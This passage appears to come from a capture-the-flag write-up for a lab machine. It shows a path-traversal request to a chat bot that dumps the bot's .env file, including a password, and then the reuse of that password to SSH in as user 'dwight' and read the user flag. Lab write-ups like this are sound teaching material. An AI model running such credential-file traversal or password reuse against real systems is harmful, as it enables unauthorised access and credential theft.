so we created a user on chat.office.paper, and you can ask the bot to list files and its content.  

-> recyclops file ../hubot/.env
recyclops:

cat: /home/dwight/sales/../hubot/: Is a directory
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>


Having this particular cred (and after testing it on various login panels) i found out that this is the password for ssh into the machine as "dwight" user.
	-> ssh dwight@10.10.11.143
		-> Queenofblad3s!23

	-> cat user.txt
		-> (... not gonna spoil the flag ofc)
